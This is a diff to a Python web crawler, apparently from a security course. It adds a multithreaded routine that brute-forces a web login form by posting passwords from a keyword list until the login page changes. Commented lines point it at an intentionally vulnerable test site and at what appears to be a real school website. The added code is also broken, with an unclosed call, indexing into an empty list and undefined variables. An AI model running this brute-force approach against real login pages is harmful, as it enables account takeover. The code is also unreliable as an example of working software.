@@ -1,5 +1,6 @@
 import re
 import threading
+import thread
 import time
 import socket
 from urlparse import urlparse
@@ -8,6 +9,9 @@ from postInfo import postInfo
 
 
 class Requester:
+    attempts = []
+    success = False
+    login_cred = ""
     host = ""
     user_agent = "CSE361-KappaBot"
     const = ("GET {0} HTTP/1.1\r\n"
@@ -158,9 +162,50 @@ class Requester:
         info.url = info.url+action[1:]
         #Attempt to login
         query = {}
+        #Only works for one username
         query[login_field] = username
-        for password in keywords:
-            query[password_field] = password
+        #for password in keywords:
+        #    query[password_field] = password
+        #    r = Requester(self.host)
+        #    response = r.post(info, query)
+        #    response_code = response.splitlines()[0]
+        #    redirect = re.search('3\d{2}',response_code)
+        #    if redirect:
+        #        new_host_index = response.find("Location: ") + len("Location: ")
+        #        new_host_end = response[new_host_index:].find('\n') + new_host_index
+        #        new_host = response[new_host_index:new_host_end]
+        #        new_host = urlparse(new_host).path
+        #        new_host = 'http://' + r.host + '/' + new_host
+        #        response = r.get(new_host, cookies=info.cookies)
+        #        print response.response_body
+        #    #If response is redirect (3**) then call get on the url at location: xxxx
+        #    #Else its probably js and just check the page returned for password
+        #    soup = BeautifulSoup(response.response_body, "html.parser")
+        #    if soup.findAll(type ="password"):
+        #        #False if Login successful(supposedly)
+        #        print response
+        #        continue
+        #    else:
+        #        return {"Username": username, "Password": password}
+        threads = []
+        for i in range(3):
+            low = (len(keywords)/4)*i
+            high = (len(keywords)/4)*(i+1)
+            threads[i] = Thread(target=ATTACK, args=(low, high, info, query, keywords)
+            threads[i].start()
+
+        for t in threads:
+            t.join()
+        return 
+    
+    def ATTACK(self, low, high, info, query, passwords):
+        global attempts
+        global success
+        global login_cred
+        for i in range(low,high):
+            if success:
+                return None
+            query[password] = passwords[i]
             r = Requester(self.host)
             response = r.post(info, query)
             response_code = response.splitlines()[0]
@@ -178,11 +223,12 @@ class Requester:
             soup = BeautifulSoup(response.response_body, "html.parser")
             if soup.findAll(type ="password"):
                 #False if Login successful(supposedly)
-                print response
                 continue
             else:
-                return {"Username": username, "Password": password}
+                login_cred =  (username, password)
+                success = True
         return None
+
 
 #path = 'http://austinchildrensacademy.org'
 #r =  Requester('http://www.badstore.net')
